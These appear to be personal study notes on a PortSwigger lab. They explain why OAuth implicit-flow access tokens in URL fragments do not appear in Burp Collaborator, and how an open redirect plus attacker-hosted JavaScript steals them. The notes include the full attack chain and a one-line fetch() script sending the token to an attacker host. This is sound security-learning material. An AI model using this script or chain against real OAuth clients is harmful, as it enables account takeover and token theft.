- Keep in mind that even when you Authorization server redirect you to where `redirect_uri`points appended with fragment that contain access token, In this particular request we don't send our access token. We need to extract the access token using javascript, then send it client but using other request.

> [!question] 
> i don't understand the solution of portswigger for exploiting Oauth2 with open redirect. what they did is making the redirect_uri points to vulnerable endpoint to open redirect then with this open redirect they went to exploit server to extract the fragment section. 
> 
> what i did instead of using exploit server, i use burp collaborator but i can't see the fragment section at all. 
> 
> and another thing i don't understand why this work?
> the fragment is for where the redirect_uri points so `redirecit_uri=https://asdf.com/?open_redirect=https://attacker.com` it will append it to be `https://asdf.com/?open_redirect=https://attacker.com#access_token=asdf` now the fragment is for a`sdf.com?open_redirect` page not for attacker page if the # was encoded that would make sense but with this i don't think i do understand what happen here

This is a sophisticated nuance of how browsers handle URLs and fragments (the `#` part). The reason you aren't seeing it in Burp Collaborator, and the reason the "Open Redirect" is the bridge to the exploit, comes down to **Browser Fragment Persistence.**

### 1. Why you can't see it in Burp Collaborator
Fragments (`#access_token=...`) are **client-side only**.
- Browsers **never** send the fragment to the server in an HTTP request.
- When your browser hits your Collaborator URL, it sends the Method, Path, and Headers, but it strips the `#` and everything after it before the packet leaves your machine.
- Burp Collaborator only sees what the server receives. Since the server never receives the fragment, Collaborator shows nothing.

To "see" a fragment, you need **JavaScript** running on the page to grab `window.location.hash` and send it back to you via a separate request. This is why PortSwigger uses an "Exploit Server" with a script, rather than just a listener like Collaborator.

---
### 2. How the Fragment "Follows" the Redirect
You asked: _Why does the fragment move from asdf.com to attacker.com?_

This is a behavior defined in the HTTP specs (specifically regarding 301/302/307 redirects). If a browser is at:

https://asdf.com/vulnerable-page#access_token=SECRET

And that page issues a `302 Redirect` to `https://attacker.com`, the browser will:
1. See the new Location header.
2. Navigate to the new URL.
3. **Re-attach the original fragment** to the new URL.

The resulting navigation looks like this:

https://attacker.com/#access_token=SECRET

**Crucially:** This only works if the "Open Redirect" happens via a **server-side header** (like `Location: ...`). If the redirect happened via JavaScript (`window.location = ...`), the fragment might be lost unless specifically handled.

---

### 3. The PortSwigger Attack Logic

Here is the chain of events that explains why their method works and yours (with Collaborator) didn't:
1. **The Setup:** The attacker provides a `redirect_uri` that points to a legitimate but vulnerable "Open Redirect" endpoint on the client's site.
2. The Delivery: The Authorization Server sends the token:
    https://client.com/oauth/callback?path=https://attacker.com/exploit#access_token=SECRET
3. **The Bounce:** The Client's server sees the `path` parameter and issues a `302 Redirect` to `https://attacker.com/exploit`.
4. The Persistence: The browser follows the redirect and appends the fragment:
    https://attacker.com/exploit#access_token=SECRET
5. **The Exfiltration:** The page at `/exploit` contains JavaScript like this:
```js
    // This script runs on the attacker's server
    fetch('https://attacker.com/log?token=' + window.location.hash);
```    
    **This** is how the fragment finally reaches the attacker's logs.

### Summary of the "Why"
- **Fragment Persistence:** Browsers automatically carry fragments over across 3xx redirects.
- **Client-Side Only:** Fragments are invisible to servers (and Collaborator) unless JavaScript extracts them.
- **The Exploit Server:** Its job isn't just to "receive" the hit, but to **host the script** that steals the fragment from the user's browser URL bar.

---

> [!Question] 
> lets say theoretically, i have manged to make redirect_uri point to my burp collaborator. then this time i will be able to see the access_token from collaborator that show the fragment 

Actually, no—even if you point the `redirect_uri` directly to your Burp Collaborator, you will **not** see the fragment (the part after the `#`).

This is a fundamental rule of how web browsers work. It is not a limitation of Burp, but a strict behavior of the HTTP protocol.

### The Fragment "Black Hole"

In the Implicit Flow, the Authorization Server sends the token back like this:

https://your-collaborator-id.oastify.com/#access_token=asdf123...

When the victim's browser sees this URL, it does the following:
1. **Parses the URL:** It identifies the host (`your-collaborator-id.oastify.com`) and the fragment (`#access_token=...`).
2. **Creates the HTTP Request:** It prepares a `GET` request to send to the host.
3. **Strips the Fragment:** Per the HTTP specification (**RFC 7230**), browsers **must not** send the fragment to the server.
4. **Sends the Request:**
```http
GET / HTTP/1.1
Host: your-collaborator-id.oastify.com
... (headers) ...
```
    Notice the `access_token` is missing.

**Burp Collaborator is a server.** Since the browser never puts the fragment into the "wire" (the network packet), the Collaborator server never receives it. Your Collaborator logs will show a successful hit to `/`, but the token remains trapped in the victim's browser address bar.

---
### Summary Table: Fragment Visibility

|**Destination**|**Does the Server see the #?**|**Can you steal the token?**|
|---|---|---|
|**Direct to Collaborator**|**No**|No (The token never leaves the browser)|
|**Direct to Attacker Page**|**No**|**Yes** (Using JavaScript to "leak" it)|
|**Redirect via Query Parameter**|**No**|**Yes** (If the redirect bounces to an Attacker Page with JS)|
